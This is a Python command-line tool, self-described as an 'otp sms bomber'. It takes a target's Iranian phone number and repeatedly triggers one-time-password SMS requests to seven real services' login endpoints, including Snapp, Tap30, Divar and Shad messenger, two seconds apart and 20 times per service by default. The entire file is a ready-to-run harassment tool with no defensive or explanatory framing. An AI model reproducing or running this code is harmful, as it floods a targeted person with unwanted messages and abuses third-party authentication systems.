# https://github.com/Aryakanani

from argparse import ArgumentParser
from urllib3 import PoolManager
from json import dumps
from time import sleep
from re import search

def send(cellphone):
    http = PoolManager()

    
    http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        headers={'Content-Type': 'application/json'},
        body=dumps({"cellphone": f"+98{cellphone}"}).encode())
    
    
    http.request("post", "https://tap33.me/api/v2/user",
        headers={'Content-Type': 'application/json'},
        body=dumps({"credential": {"phoneNumber": f"0{cellphone}", "role": "PASSENGER"}}).encode())

    
    http.request("post", "https://www.echarge.ir/m/login?length=19",
        headers={'Content-Type': 'application/json'},
        body=dumps({"phoneNumber": f'0{cellphone}'}).encode())

   
    http.request("post", "https://api.divar.ir/v5/auth/authenticate",
        headers={'Content-Type': 'application/json'},
        body=dumps({"phone": f'0{cellphone}'}).encode())

        
    http.request("post", "https://shadmessenger12.iranlms.ir/",
     headers={'Content-Type': 'application/json'},
      body=dumps({"phone": f'0{cellphone}'}).encode())

      
    http.request("post", "https://messengerg2c4.iranlms.ir/",
     headers={'Content-Type': 'application/json'},
      body=dumps({"phone": f'+{cellphone}'}).encode())

    
    http.request("post", "https://web.emtiyaz.app/json/login",
     headers={'Content-Type': 'application/json'},
      body=dumps({"phone": f'+98{cellphone}'}).encode())

def spam(args):
    if (search(r'9\d{9}$', args.cellphone)):
        for time in range(args.times):
            print(f"\rSending sms {time+1}/{args.times}", end='')
            try:
                send(args.cellphone)
            except KeyboardInterrupt:
                exit()
            sleep(2)
        print('')
    else:
        print("error: invalid cellphone format, format: 9\d{9} e.g. 991****")

def main():
    parser = ArgumentParser(prog="asmsb",
        description="otp sms bomber",
        epilog="By <Arya>")
    parser.add_argument("cellphone", help="target cellphone: e.g. 902****")
    parser.add_argument("--times", help="count of SMSs (per service!)", type=int, default=20)
    spam(parser.parse_args())

if (__name__ == "__main__"):
    main()